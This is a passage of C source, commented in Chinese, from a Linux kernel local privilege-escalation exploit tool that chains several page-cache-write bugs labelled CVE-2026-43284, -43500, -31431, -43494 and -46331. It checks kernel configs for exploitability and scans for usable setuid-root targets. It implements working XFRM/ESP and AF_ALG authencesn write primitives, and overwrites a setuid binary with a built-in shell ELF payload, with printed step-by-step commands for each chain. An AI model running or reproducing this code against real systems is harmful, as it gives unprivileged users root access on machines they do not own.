		snprintf(cmd, sizeof(cmd), "gzip -dc '%s' 2>/dev/null", path);
		return popen(cmd, "r");
	}
	return fopen(path, "r");
}

static void close_config(FILE *f, const char *path)
{
	if (strstr(path, ".gz"))
		pclose(f);
	else
		fclose(f);
}

static char *read_config_to_mem(const char *path)
{
	FILE *f = open_config(path);
	char *buf;
	size_t cap = 65536, len = 0;
	char tmp[8192];
	size_t got;

	if (!f)
		return NULL;
	buf = malloc(cap);
	if (!buf) {
		close_config(f, path);
		return NULL;
	}
	while ((got = fread(tmp, 1, sizeof(tmp), f)) > 0) {
		if (len + got + 1 > cap) {
			size_t ncap = cap * 2;
			char *nb;

			if (ncap < len + got + 1)
				ncap = len + got + 1;
			nb = realloc(buf, ncap);
			if (!nb) {
				free(buf);
				close_config(f, path);
				return NULL;
			}
			buf = nb;
			cap = ncap;
		}
		memcpy(buf + len, tmp, got);
		len += got;
	}
	buf[len] = '\0';
	close_config(f, path);
	return buf;
}

static int config_lookup(const char *mem, const char *name)
{
	size_t nl = strlen(name);
	const char *p = mem;

	while (p && *p) {
		if (strncmp(p, name, nl) == 0) {
			char c = p[nl];

			if (c == '=') {
				char v = p[nl + 1];

				if (v == 'y' || v == 'Y')
					return 2;
				if (v == 'm' || v == 'M')
					return 1;
				return 0;   /* "=n" 或未知值 */
			}
			/* "# CONFIG_X is not set" */
			if ((c == ' ' || c == '\t') &&
			    strncmp(p, "# ", 2) == 0 &&
			    strstr(p, "is not set"))
				return 0;
		}
		p = strchr(p, '\n');
		if (!p)
			break;
		p++;
	}
	return 0;
}

static int module_loaded(const char *modname)
{
	FILE *f = fopen("/proc/modules", "r");
	char line[512];
	int rc = -1;

	if (!f)
		return -1;
	while (fgets(line, sizeof(line), f)) {
		char *sp = line;

		/* 截到第一个空白, 取出模块名 (首列) */
		while (*sp && *sp != ' ' && *sp != '\t' && *sp != '\n')
			sp++;
		*sp = '\0';
		if (strcmp(line, modname) == 0) {
			rc = 1;
			break;
		}
	}
	if (rc == -1)
		rc = 0;
	fclose(f);
	return rc;
}

static int kernel_config_check(void)
{
	char path[1024];
	const char *cfg;
	char *mem;
	struct utsname ut;
	int pass = 0, fail = 0, total_req = 0, mod_warn = 0;
	size_t i;

	if (uname(&ut) == 0)
		pmsg("[*] 运行内核: %s (本 exp 编写目标: 4.14.186)\n",
		       ut.release);

	cfg = find_config(path, sizeof(path));
	if (!cfg) {
		pmsg("[-] 找不到内核配置文件。已尝试:\n");
		pmsg("       /proc/config.gz  (/boot/config-* 源)\n");
		pmsg("       /boot/config-<release>\n");
		pmsg("       /lib/modules/<release>/build/.config\n");
		pmsg("       /usr/src/linux-headers-<release>/.config\n");
		pmsg("[-] 若 /proc/config.gz 缺失, 需内核开启 CONFIG_IKCONFIG_PROC;\n");
		pmsg("     /boot 下无 config 则本机没有留存, 请换台能取到配置的内核。\n");
		return 1;
	}
	pmsg("[*] 配置文件: %s\n", cfg);
	if (g_cfg_chain == CHAIN_ESP)
		pmsg("[*] 检查范围: 仅 CVE-2026-43284 (XFRM/ESP)\n");
	else if (g_cfg_chain == CHAIN_RXRPC)
		pmsg("[*] 检查范围: 仅 CVE-2026-43500 (RxRPC/RXKAD)\n");
	else if (g_cfg_chain == CHAIN_COPY)
		pmsg("[*] 检查范围: 仅 CVE-2026-31431 (AF_ALG/AEAD Copy Fail)\n");
	else if (g_cfg_chain == CHAIN_UAF)
		pmsg("[*] 检查范围: 仅 CVE-2026-43494 (io_uring + RDS)\n");
	else if (g_cfg_chain == CHAIN_PEDIT)
		pmsg("[*] 检查范围: 仅 CVE-2026-46331 (net/sched act_pedit)\n");
	else
		pmsg("[*] 检查范围: 五条链 (43284 ESP / 43500 RxRPC / 31431 Copy Fail / 43494 io_uring / 46331 pedit)\n");

	mem = read_config_to_mem(cfg);
	if (!mem) {
		pmsg("[-] 读取配置失败: %s\n", strerror(errno));
		pmsg("[-] (gzip 解压 /proc/config.gz 失败? 确认系统有 gzip)\n");
		return 1;
	}

	pmsg("\n%s 必需配置 (y 或 m 即视为通过; 若为 m 进一步检测模块是否加载)%s\n",
	       color_enabled() ? CLR_GREEN : "",
	       color_enabled() ? CLR_RST : "");
	for (i = 0; g_cfg_reqs[i].name; i++) {
		const struct cfg_req *r = &g_cfg_reqs[i];
		char statebuf[48];
		const char *tag;
		int v, ml = 0;

		if (!r->required || !cfg_wanted(r))
			continue;
		v = config_lookup(mem, r->name);
		if (v == 2) {
			snprintf(statebuf, sizeof(statebuf), "y  (built-in)");
			tag = "[+]";
		} else if (v == 1 && r->modname) {
			ml = module_loaded(r->modname);
			if (ml == 1) {
				snprintf(statebuf, sizeof(statebuf),
					 "m  (模块 %s 已加载)", r->modname);
				tag = "[+]";
			} else if (ml == 0) {
				snprintf(statebuf, sizeof(statebuf),
					 "m  (模块 %s 未加载!)", r->modname);
				tag = "[!]";
				mod_warn++;
			} else {
				snprintf(statebuf, sizeof(statebuf),
					 "m  (模块 %s 无法判断)", r->modname);
				tag = "[!]";
			}
		} else if (v == 1) {
			snprintf(statebuf, sizeof(statebuf), "m  (module)");
			tag = "[+]";
		} else {
			snprintf(statebuf, sizeof(statebuf), "n / 缺失");
			tag = "[-]";
		}
		pmsg("%s %-34s %-26s %s\n",
		       tag, r->name, statebuf, r->desc);
		total_req++;
		if (v)
			pass++;
		else
			fail++;
	}

	pmsg("\n%s 建议/诊断配置 (非必须)%s\n",
	       color_enabled() ? CLR_CYAN : "",
	       color_enabled() ? CLR_RST : "");
	for (i = 0; g_cfg_reqs[i].name; i++) {
		const struct cfg_req *r = &g_cfg_reqs[i];
		char statebuf[48];
		const char *tag;
		int v, ml = 0;

		if (r->required || !cfg_wanted(r))
			continue;
		v = config_lookup(mem, r->name);
		if (v == 2) {
			snprintf(statebuf, sizeof(statebuf), "y  (built-in)");
			tag = "[*]";
		} else if (v == 1 && r->modname) {
			ml = module_loaded(r->modname);
			if (ml == 1) {
				snprintf(statebuf, sizeof(statebuf),
					 "m  (模块 %s 已加载)", r->modname);
				tag = "[*]";
			} else if (ml == 0) {
				snprintf(statebuf, sizeof(statebuf),
					 "m  (模块 %s 未加载)", r->modname);
				tag = "[!]";
			} else {
				snprintf(statebuf, sizeof(statebuf),
					 "m  (模块 %s 无法判断)", r->modname);
				tag = "[!]";
			}
		} else if (v == 1) {
			snprintf(statebuf, sizeof(statebuf), "m  (module)");
			tag = "[*]";
		} else {
			snprintf(statebuf, sizeof(statebuf), "n / 缺失");
			tag = "[!]";
		}
		pmsg("%s %-34s %-26s %s\n",
		       tag, r->name, statebuf, r->desc);
	}

	free(mem);

	pmsg("\n[*] 结论: 必需配置 %d/%d 通过", pass, total_req);
	if (fail == 0) {
		pmsg(" —— 配置层面具备利用条件。\n");
		if (g_cfg_chain == CHAIN_RXRPC)
			pmsg("[*] 下一步: ./exp -2026-43500 -start --corrupt-only 验证页缓存是否真被改写\n");
		else if (g_cfg_chain == CHAIN_ESP)
			pmsg("[*] 下一步: ./exp -2026-43284 -start -to <文件> -set <内容> 做一次受控写入\n");
		else if (g_cfg_chain == CHAIN_COPY)
			pmsg("[*] 下一步: ./exp -2026-31431 -start -to <文件> -set <内容> 做一次受控写入 (无需 userns)\n");
		else if (g_cfg_chain == CHAIN_UAF)
			pmsg("[*] 下一步: ./exp -2026-43494 -start 尝试整页替换 setuid 文件\n");
		else if (g_cfg_chain == CHAIN_PEDIT)
			pmsg("[*] 下一步: ./exp -2026-46331 -to <文件> -set <内容> -offset 0 做一次受控写入\n");
		else
			pmsg("[*] 下一步: 加编号 + -start 单独跑一条链验证\n");
		pmsg("[*] (配置存在 ≠ 漏洞存在: 若内核已加 skb_has_shared_frag 回退则已修复)。\n");
		if (g_cfg_chain == 0 || g_cfg_chain == CHAIN_UAF) {
			pmsg("\n[*] io_uring 运行时能力探测:\n");
			uaf_probe();
		}
	} else {
		pmsg(" —— 有 %d 项未满足, 该链无法成立。\n", fail);
	}

	if (mod_warn) {
		pmsg("\n[!] %d 个必需配置是模块(m)但未加载: 利用时内核通常会在 "
		       "首次用到时按需 request_module 自动加载;\n", mod_warn);
		pmsg("    若系统禁用了自动加载 (modules_disabled / 找不到 "
		       "modprobe), 需先手动 modprobe 对应模块再运行本 exp。\n");
	}

	if (g_cfg_chain == CHAIN_ESP || g_cfg_chain == 0) {
		pmsg("[*] 注(ESP 链): 即便 CONFIG_USER_NS=y, 部分发行版用 "
		       "sysctl kernel.unprivileged_userns_clone=0\n");
		pmsg("    禁用了非特权 userns, 此时 ESP 链需要 root/CAP_NET_ADMIN 才能注册 SA。\n");
	}
	if (g_cfg_chain == CHAIN_RXRPC || g_cfg_chain == 0)
		pmsg("[*] 注(RxRPC 链): 不需要 user namespace, 但需要 RXKAD 与 "
		       "AF_ALG(pcbc/fcrypt) 可用。\n");
	if (g_cfg_chain == CHAIN_COPY || g_cfg_chain == 0)
		pmsg("[*] 注(Copy Fail 链): 不需要 userns / 不需要任何 capability, "
		       "只要有 AF_ALG AEAD 即可; 三条链里门槛最低。\n");
	return fail ? 1 : 0;
}

static int backup_file(const char *src, char *out, size_t outsz)
{
	char tmpl[] = "/tmp/dirtyfrag_bak_XXXXXX";
	char buf[65536];
	struct stat st;
	ssize_t n;
	int in, ofd, rc = -1;

	in = open(src, O_RDONLY);
	if (in < 0)
		return -1;
	ofd = mkstemp(tmpl);
	if (ofd < 0) {
		close(in);
		return -1;
	}
	while ((n = read(in, buf, sizeof(buf))) > 0) {
		ssize_t w = 0;

		while (w < n) {
			ssize_t k = write(ofd, buf + w, (size_t)(n - w));

			if (k <= 0)
				goto out;
			w += k;
		}
	}
	if (n < 0)
		goto out;
	if (fstat(in, &st) == 0)
		fchmod(ofd, st.st_mode & 07777);
	snprintf(out, outsz, "%s", tmpl);
	rc = 0;
out:
	close(in);
	close(ofd);
	if (rc < 0)
		unlink(tmpl);
	return rc;
}

static int restore_file(const char *bak, const char *dst)
{
	char buf[65536];
	ssize_t n;
	int in, ofd, rc = -1;

	in = open(bak, O_RDONLY);
	if (in < 0)
		return -1;
	ofd = open(dst, O_WRONLY | O_TRUNC);
	if (ofd < 0) {
		close(in);
		return -1;
	}
	while ((n = read(in, buf, sizeof(buf))) > 0) {
		ssize_t w = 0;

		while (w < n) {
			ssize_t k = write(ofd, buf + w, (size_t)(n - w));

			if (k <= 0)
				goto out;
			w += k;
		}
	}
	if (n < 0)
		goto out;
	/*
	 * write() 会触发内核 file_remove_privs(), 清掉 setuid/setgid 位。
	 * 从备份文件还原 mode (backup_file 已把原 mode fchmod 到备份上),
	 * 否则恢复后目标不再是 setuid root。
	 */
	{
		struct stat st;

		if (stat(bak, &st) == 0)
			fchmod(ofd, st.st_mode & 07777);
	}
	rc = 0;
out:
	close(in);
	close(ofd);
	return rc;
}

static void try_restore(const char *bak, const char *dst)
{
	if (restore_file(bak, dst) == 0) {
		pmsg("[+] 已从备份恢复原文件: %s\n", dst);
	} else {
		pmsg("[!] 自动恢复失败 (无写权限)。原文件备份在 %s\n", bak);
		pmsg("    提权后可手动恢复: cp %s %s\n", bak, dst);
	}
}

static void fmt_size(char *buf, size_t sz, long long n)
{
	if (n >= 1024 * 1024)
		snprintf(buf, sz, "%.1fM", (double)n / 1048576.0);
	else if (n >= 1024)
		snprintf(buf, sz, "%.0fK", (double)n / 1024.0);
	else
		snprintf(buf, sz, "%lldB", n);
}

static int opt_has(const char *opts, const char *name)
{
	const char *p = opts;
	size_t n = strlen(name);

	while (*p) {
		const char *e = strchr(p, ',');

		if (!e)
			e = p + strlen(p);
		if ((size_t)(e - p) == n && !strncmp(p, name, n))
			return 1;
		if (!*e)
			break;
		p = e + 1;
	}
	return 0;
}

static void load_mounts(void)
{
	FILE *f = fopen("/proc/mounts", "r");
	char line[8192];

	if (!f)
		f = fopen("/proc/self/mounts", "r");
	if (!f)
		return;
	while (fgets(line, sizeof(line), f) && g_nmnts < MAX_MNTS) {
		char dev[256], dir[PATH_MAX], fstype[64], opts[2048];
		struct mnt_ent *m;

		if (sscanf(line, "%255s %4095s %63s %2047s",
			   dev, dir, fstype, opts) != 4)
			continue;
		m = &g_mnts[g_nmnts++];
		snprintf(m->dir, sizeof(m->dir), "%s", dir);
		snprintf(m->fstype, sizeof(m->fstype), "%s", fstype);
		m->nosuid = opt_has(opts, "nosuid");
		m->ro = opt_has(opts, "ro");
	}
	fclose(f);
}

static const struct mnt_ent *mnt_for(const char *path)
{
	const struct mnt_ent *best = NULL;
	size_t bestlen = 0;
	int i;

	for (i = 0; i < g_nmnts; i++) {
		const struct mnt_ent *m = &g_mnts[i];
		size_t dl = strlen(m->dir);

		if (dl == 1 && m->dir[0] == '/') {
			if (!best || dl >= bestlen) {
				best = m;
				bestlen = dl;
			}
			continue;
		}
		if (!strncmp(path, m->dir, dl) &&
		    (path[dl] == '/' || path[dl] == '\0')) {
			if (dl >= bestlen) {
				best = m;
				bestlen = dl;
			}
		}
	}
	return best;
}

static int fs_is_readonly_image(const char *fstype)
{
	return !strcmp(fstype, "squashfs") || !strcmp(fstype, "iso9660") ||
	       !strcmp(fstype, "erofs") || !strcmp(fstype, "cramfs");
}

static void elf_brief(const char *path, char *desc, size_t descsz)
{
	unsigned char h[20];
	uint16_t et = 0;
	const char *cls, *typ;
	int fd, n;

	fd = open(path, O_RDONLY);
	if (fd < 0) {
		snprintf(desc, descsz, "?");
		return;
	}
	n = (int)read(fd, h, sizeof(h));
	close(fd);
	if (n < 18 || memcmp(h, ELFMAG, SELFMAG) != 0) {
		snprintf(desc, descsz, "非ELF");
		return;
	}
	cls = h[EI_CLASS] == ELFCLASS64 ? "ELF64" :
	      h[EI_CLASS] == ELFCLASS32 ? "ELF32" : "ELF?";
	memcpy(&et, h + 16, 2);   /* e_type 在 e_ident 之后, 偏移 16 */
	typ = et == ET_EXEC ? "EXEC" : et == ET_DYN ? "DYN" : "?";
	snprintf(desc, descsz, "%s %s", cls, typ);
}

static void scan_report(const char *path, const struct stat *st)
{
	const struct mnt_ent *m = mnt_for(path);
	char sz[32], desc[32], note[96];
	int nosuid = m && m->nosuid;
	int roimg = m && (m->ro || fs_is_readonly_image(m->fstype));
	int usable;

	if (!S_ISREG(st->st_mode))
		return;   /* lstat 下符号链接不带 setuid 位, 这里基本只处理普通文件 */
	fmt_size(sz, sizeof(sz), (long long)st->st_size);
	elf_brief(path, desc, sizeof(desc));

	if (st->st_size < SCAN_MIN_SIZE)
		snprintf(note, sizeof(note), "太小");
	else if (nosuid)
		snprintf(note, sizeof(note), "nosuid: setuid 不生效");
	else if (roimg)
		snprintf(note, sizeof(note), "只读fs(%s)",
			 m ? m->fstype : "?");
	else
		snprintf(note, sizeof(note), "可作目标");

	usable = st->st_size >= SCAN_MIN_SIZE && !nosuid && !roimg;
	g_scan_total++;
	if (usable)
		g_scan_usable++;
	pmsg("%s %-44s %8s  %-11s %s\n",
	       usable ? "[+]" : "[!]", path, sz, desc, note);
}

static int dir_skipped(const char *name)
{
	static const char *skip[] = {
		"proc", "sys", "dev", "run", "tmp", NULL
	};
	int i;

	for (i = 0; skip[i]; i++)
		if (!strcmp(name, skip[i]))
			return 1;
	return 0;
}

static void scan_dir(const char *dir, int depth)
{
	DIR *d;
	struct dirent *de;

	if (depth > SCAN_MAX_DEPTH)
		return;
	d = opendir(dir);
	if (!d)
		return;
	while ((de = readdir(d))) {
		char path[PATH_MAX];
		struct stat st;
		int len;

		if (de->d_name[0] == '.' &&
		    (de->d_name[1] == '\0' ||
		     (de->d_name[1] == '.' && de->d_name[2] == '\0')))
			continue;
		if (dir_skipped(de->d_name))
			continue;
		if (!strcmp(dir, "/"))
			len = snprintf(path, sizeof(path), "/%s", de->d_name);
		else
			len = snprintf(path, sizeof(path), "%s/%s",
				       dir, de->d_name);
		if (len < 0 || len >= (int)sizeof(path))
			continue;
		if (lstat(path, &st) < 0)
			continue;
		if (S_ISDIR(st.st_mode))
			scan_dir(path, depth + 1);
		else if ((st.st_mode & S_ISUID) && st.st_uid == 0)
			scan_report(path, &st);
	}
	closedir(d);
}

static int scan_setuid_files(void)
{
	long long t0 = now_ms();

	load_mounts();
	pmsg("[*] 扫描 setuid root 文件 (等价 find / -perm -4000 -user root,\n"
	       "    跳过 /proc /sys /dev /run /tmp) ...\n\n");
	scan_dir("/", 0);
	pmsg("\n[*] 共 %d 个 setuid root 普通文件, 其中 %d 个真正可用 "
	       "(>=%d 字节, 且非 nosuid / 只读镜像)\n",
	       g_scan_total, g_scan_usable, SCAN_MIN_SIZE);
	pmsg("[!] nosuid: execve 忽略 setuid, 写了也不提权; "
	       "只读fs: 页缓存写回通常失败\n");
	if (g_scan_usable) {
		pmsg("[*] 用法: ./exp -2026-43284 -start -to <上面 [+] 的某个路径> "
		       "-set <payload 文件>\n");
		pmsg("    该路径走 ESP 链, 会直接覆盖目标文件头部, 记得先备份; "
		       "实际所需大小取决于 payload\n");
	}
	pmsg("[*] 耗时 %lld ms\n", now_ms() - t0);
	return g_scan_usable ? 0 : 1;
}



/* ===================== -to/-set 通用 ESP 写入 ===================== */
#define DFS_SPI_BASE   0x5EED0000u
#define DFS_MAX_PAYLOAD (4096 * 4)

static int df_load_payload(const char *path, uint8_t **out, size_t *outlen)
{
	int fd = open(path, O_RDONLY);
	struct stat st;
	uint8_t *buf;
	ssize_t n;
	size_t off = 0, len, alloc;

	if (fd < 0) {
		WARN("打开 %s 失败: %s", path, strerror(errno));
		return -1;
	}
	if (fstat(fd, &st) < 0 || !S_ISREG(st.st_mode)) {
		WARN("%s 不是普通文件", path);
		close(fd);
		return -1;
	}
	if (st.st_size <= 0 || st.st_size > DFS_MAX_PAYLOAD) {
		WARN("payload 大小非法: %lld (上限 %d)", (long long)st.st_size,
		     DFS_MAX_PAYLOAD);
		close(fd);
		return -1;
	}
	len = (size_t)st.st_size;
	alloc = (len + 3) & ~(size_t)3;
	buf = calloc(1, alloc);
	if (!buf) {
		close(fd);
		return -1;
	}
	while (off < len) {
		n = read(fd, buf + off, len - off);
		if (n <= 0) {
			close(fd);
			free(buf);
			return -1;
		}
		off += (size_t)n;
	}
	close(fd);
	*out = buf;
	*outlen = len;
	return 0;
}

/* 在 userns/netns 内把 data 逐 4 字节写进 target@base_off (ESP 原语) */
static int df_generic_write(const char *target, const uint8_t *data,
			    size_t len, off_t base_off)
{
	size_t words = (len + 3) / 4;
	size_t i;

	setup_userns_netns();          /* 直接 unshare 当前进程, 必须在子进程里调 */
	usleep(100 * 1000);

	for (i = 0; i < words; i++) {
		uint32_t w = ((uint32_t)data[i * 4 + 0] << 24) |
			     ((uint32_t)data[i * 4 + 1] << 16) |
			     ((uint32_t)data[i * 4 + 2] << 8) |
			     ((uint32_t)data[i * 4 + 3]);

		if (add_xfrm_sa(DFS_SPI_BASE + (uint32_t)i, w) < 0) {
			WARN("注册 XFRM SA #%zu 失败", i);
			return -3;   /* XFRM 不可用 ≠ 写失败, 调用方可据此区分 */
		}
	}
	LOG("已注册 %zu 个 XFRM SA", words);

	for (i = 0; i < words; i++) {
		off_t off = base_off + (off_t)i * 4;

		if (do_one_write(target, off, DFS_SPI_BASE + (uint32_t)i) < 0) {
			LOG("第 %zu 次写入 (off=0x%llx) 失败", i,
			    (unsigned long long)off);
			return -1;
		}
	}
	LOG("已写入 %zu 字节到 %s (起始 0x%llx)", len, target,
	    (unsigned long long)base_off);
	return 0;
}

static int df_verify(const char *target, const uint8_t *data,
		     size_t len, off_t base_off)
{
	uint8_t *got = calloc(1, len);
	size_t i, bad = 0;
	int fd, rc = -1;

	if (!got)
		return -1;
	fd = open(target, O_RDONLY);
	if (fd < 0) {
		free(got);
		return -1;
	}
	if (pread(fd, got, len, base_off) == (ssize_t)len) {
		for (i = 0; i < len; i++)
			if (got[i] != data[i])
				bad++;
		if (bad == 0) {
			LOG("回读校验通过: %s[0x%llx..] 与 -set 一致", target,
			    (unsigned long long)base_off);
			rc = 0;
		} else {
			WARN("回读校验失败: %zu/%zu 字节不符 (首个不符见 -v)",
			     bad, len);
		}
	} else {
		WARN("回读 %s 失败: %s", target, strerror(errno));
	}
	close(fd);
	free(got);
	return rc;
}

/* ============ CVE-2026-31431 (Copy Fail): AF_ALG AEAD 页缓存写 ============ */
/*
 * 原理: algif_aead 的 in-place 优化让 splice() 进来的文件页直接成为
 *       解密输出 scatterlist; authencesn 为支持 ESN 会在收尾处把 4 字节
 *       seqno_hi 写到 assoclen+cryptlen 之后, 越界落在该页上。
 *       因此: 发的 8 字节 AAD = "AAAA" + 想写的 4 字节, 再把文件 [0, t+4)
 *       splice 进去, 那 4 字节就被写到文件偏移 t。
 * 优点: 不需要 user namespace, 不需要任何 capability, 不需要 SA/握手。
 */

#define COPY_ALG_NAME "authencesn(hmac(sha256),cbc(aes))"

/* 72 字节 authenc 密钥块: 4 字节 enckeylen 头 + hmac 密钥 + AES 密钥,
 * 与公开 PoC 保持一致 (该组合能稳定落到越界写分支) */
static const uint8_t copy_key[72] = {
	0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10,
};

static void copy_put_cmsg(char *buf, size_t *off, int type,
			  const void *data, size_t len)
{
	struct cmsghdr *c = (struct cmsghdr *)(buf + *off);

	c->cmsg_level = SOL_ALG;
	c->cmsg_type  = type;
	c->cmsg_len   = CMSG_LEN(len);
	memcpy(CMSG_DATA(c), data, len);
	*off += CMSG_SPACE(len);
}

/* 在目标文件偏移 t 处写入 clen (<=4) 字节 (clen 会被补齐到 4)
 * 返回 0 = 成功, -1 = 本次失败, -2 = 内核没有该算法(上层应中止) */
static int copy_write_chunk(int fd, off_t t, const uint8_t *chunk, size_t clen)
{
	struct sockaddr_alg sa;
	struct msghdr msg;
	struct iovec iov;
	char cbuf[CMSG_SPACE(4) + CMSG_SPACE(20) + CMSG_SPACE(4)];
	uint8_t iv[20];
	uint8_t head[8];
	uint32_t op_dec = ALG_OP_DECRYPT;
	uint32_t assoclen = 8;
	off_t src_off = 0;
	size_t o = (size_t)t + 4;      /* 需要 splice 的文件前缀长度 */
	size_t co = 0, rlen;
	uint8_t *rbuf;
	ssize_t n;
	int tfm = -1, op = -1, pfd[2] = { -1, -1 };
	int rc = -1;

	memset(&sa, 0, sizeof(sa));
	sa.salg_family = AF_ALG;
	strncpy((char *)sa.salg_type, "aead", sizeof(sa.salg_type) - 1);
	strncpy((char *)sa.salg_name, COPY_ALG_NAME, sizeof(sa.salg_name) - 1);

	tfm = socket(AF_ALG, SOCK_SEQPACKET, 0);
	if (tfm < 0) {
		DBG("socket(AF_ALG): %s", strerror(errno));
		return -1;
	}
	if (bind(tfm, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		int e = errno;

		if (e == ENOENT || e == ENOTDIR) {
			/* 算法/接口不存在: 内核没编也没模块, 后面每块都会这样,
			 * 只提示一次并让上层直接中止 */
			static int warned;

			if (!warned) {
				warned = 1;
				WARN("内核没有可用的 %s", COPY_ALG_NAME);
				WARN("需要 CONFIG_CRYPTO_AUTHENC / USER_API_AEAD, "
				     "或先 modprobe authencesn algif_aead");
			}
			close(tfm);
			return -2;
		}
		DBG("bind(%s): %s", COPY_ALG_NAME, strerror(e));
		goto out;
	}
	if (setsockopt(tfm, SOL_ALG, ALG_SET_KEY,
		       copy_key, sizeof(copy_key)) < 0) {
		DBG("ALG_SET_KEY: %s", strerror(errno));
		goto out;
	}
	if (setsockopt(tfm, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, 4) < 0) {
		DBG("ALG_SET_AEAD_AUTHSIZE: %s", strerror(errno));
		goto out;
	}
	op = accept(tfm, NULL, NULL);
	if (op < 0) {
		DBG("accept(AF_ALG): %s", strerror(errno));
		goto out;
	}

	memset(cbuf, 0, sizeof(cbuf));
	copy_put_cmsg(cbuf, &co, ALG_SET_OP, &op_dec, 4);
	memset(iv, 0, sizeof(iv));
	iv[0] = 0x10;
	copy_put_cmsg(cbuf, &co, ALG_SET_IV, iv, sizeof(iv));
	copy_put_cmsg(cbuf, &co, ALG_SET_AEAD_ASSOCLEN, &assoclen, 4);

	/* AAD: "AAAA" + 要写的 4 字节 (authencesn 会把后 4 字节写到页上) */
	memset(head, 'A', 4);
	memcpy(head + 4, chunk, clen > 4 ? 4 : clen);

	memset(&msg, 0, sizeof(msg));
	memset(&iov, 0, sizeof(iov));
	iov.iov_base = head;
	iov.iov_len = 4 + (clen > 4 ? 4 : clen);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = cbuf;
	msg.msg_controllen = co;

	/* MSG_MORE: 让紧随其后的 splice/sendpage 追加进同一个请求 */
	n = sendmsg(op, &msg, MSG_MORE);
	if (n < 0) {
		DBG("sendmsg: %s", strerror(errno));
		goto out;
	}

	if (pipe(pfd) < 0) {
		DBG("pipe: %s", strerror(errno));
		goto out;
	}
	n = splice(fd, &src_off, pfd[1], NULL, o, 0);
	if (n < 0) {
		DBG("splice(file->pipe) @%lld: %s", (long long)t, strerror(errno));
		goto out;
	}
	n = splice(pfd[0], NULL, op, NULL, o, 0);
	if (n < 0) {
		DBG("splice(pipe->op) @%lld: %s", (long long)t, strerror(errno));
		goto out;
	}

	/* recv 触发解密, 越界写在这一步发生 */
	rlen = 8 + (size_t)t;
	rbuf = malloc(rlen ? rlen : 1);
	if (!rbuf) {
		DBG("内存不足");
		goto out;
	}
	n = recv(op, rbuf, rlen, 0);
	if (n < 0)
		DBG("recv @%lld: %s", (long long)t, strerror(errno));
	free(rbuf);

	rc = 0;
out:
	if (pfd[0] >= 0) close(pfd[0]);
	if (pfd[1] >= 0) close(pfd[1]);
	if (op >= 0) close(op);
	if (tfm >= 0) close(tfm);
	return rc;
}

/* 把 data[0..len) 写到 path 的 base 偏移处, 每块 4 字节 */
static int copy_write_file(const char *path, const uint8_t *data,
			   size_t len, off_t base)
{
	int fd;
	size_t done = 0, blocks;
	int ok = 0;

	fd = open(path, O_RDONLY);
	if (fd < 0) {
		WARN("打开 %s 失败: %s", path, strerror(errno));
		return -1;
	}

	blocks = (len + 3) / 4;
	for (done = 0; done < len; done += 4) {
		uint8_t chunk[4] = { 0, 0, 0, 0 };
		size_t n = len - done;
		off_t off = base + (off_t)done;

		if (n > 4)
			n = 4;
		memcpy(chunk, data + done, n);
		/* 末块不足 4 字节: 用文件原有字节补齐, 避免改坏后面 1-3 字节 */
		if (n < 4) {
			uint8_t tail[4];

			if (pread(fd, tail, 4, off) == 4) {
				memcpy(tail, data + done, n);
				memcpy(chunk, tail, 4);
			}
		}
		int cr = copy_write_chunk(fd, off, chunk, 4);

		if (cr == 0) {
			ok++;
		} else if (cr == -2) {
			close(fd);
			return -2;   /* 算法不可用, 已提示过, 不再逐块重试 */
		} else {
			WARN("偏移 0x%llx 写入失败", (unsigned long long)off);
		}
		if (g_verbose && (done % 64) == 0 && done)
			DBG("进度 %zu/%zu 字节", done, len);
	}
	close(fd);

	if ((size_t)ok == blocks) {
		LOG("AF_ALG 写入完成: %d/%zu 块 (每块 4 字节)", ok, blocks);
		return 0;
	}
	WARN("AF_ALG 写入不完整: %d/%zu 块成功", ok, blocks);
	return -1;
}

/* 固定利用: 把内置 payload 写进 target 的页缓存 */
static int copyfail_run(const char *target)
{
	LOG("CVE-2026-31431 (Copy Fail): AF_ALG %s", COPY_ALG_NAME);
	LOG("目标 %s, payload %d 字节, 每块 4 字节, 无需 userns",
	    target, PAYLOAD_LEN);
	return copy_write_file(target, shell_elf, PAYLOAD_LEN, 0);
}

/* ===================== 移植模块结束 ===================== */

/* =====================================================================
 * 第四条链: CVE-2026-43494  io_uring + RDS zerocopy
 *          页引用计数劫持 (page UAF 写)
 *
 *  1) mmap 一页 anon, io_uring REGISTER_BUFFERS 固定它 (refcount +1024)
 *  2) REGISTER_CLONE_BUFFERS 克隆到 ring2, 让 imu->refs=2
 *  3) 用 RDS zerocopy 发送失败, 每次偷走 1 个引用, 1024 次后 refcount ~= 1
 *  4) fadvise(DONTNEED) 把 setuid 文件的目标页逐出
 *  5) munmap 那一页 -> refcount 归零 -> 释放到 PCP 栈顶
 *  6) 立刻读 setuid 文件 -> 页缓存分配从 PCP 拿到同一个 struct page
 *  7) IORING_OP_READ_FIXED 仍指向该 page -> DMA 把 payload 写进页缓存
 *  8) 执行 setuid 文件 -> root
 *
 * 与上面三条链不同: 这里不是 4 字节原地解密, 而是整页 4096 字节替换。
 * 需要有 IORING_REGISTER_CLONE_BUFFERS (6.12+ 才有), 老内核会在第 2 步
 * 直接 EINVAL —— -check 会给出结论。
 * ===================================================================== */
#define UAF_PGSZ       4096
#define UAF_BIAS       1024          /* GUP_PIN_COUNTING_BIAS */
#define UAF_PORT_BASE  20000
#define UAF_RETRIES    5

/* 日志统一用本文件的 LOG/WARN, 这里只补原代码用到的 ANSI 别名 */
#ifndef ANSI_RESET
#define ANSI_RESET  CLR_RST
#define ANSI_BOLD   "\033[1m"
#define ANSI_RED    CLR_RED
#define ANSI_GREEN  CLR_GRN
#define ANSI_YELLOW CLR_YEL
#define ANSI_CYAN   CLR_CYN
#define ANSI_WHITE  "\033[1;37m"
#endif

/* RDS 常量: 不引 <linux/rds.h>, 避免与 <net/if.h>/<linux/if.h> 打架 */
#ifndef AF_RDS
#define AF_RDS                  21
#endif
#ifndef PF_RDS
#define PF_RDS                  21
#endif
#ifndef SOL_RDS
#define SOL_RDS                 276
#endif
#ifndef SO_RDS_TRANSPORT
#define SO_RDS_TRANSPORT        133
#endif
#ifndef RDS_CMSG_ZCOPY_COOKIE
#define RDS_CMSG_ZCOPY_COOKIE   15
#endif
#ifndef RDS_TRANS_TCP
#define RDS_TRANS_TCP           2
#endif

/* 6.12 之前的内核头里没有这个常量/结构, 自带一份 */
#ifndef IORING_REGISTER_CLONE_BUFFERS
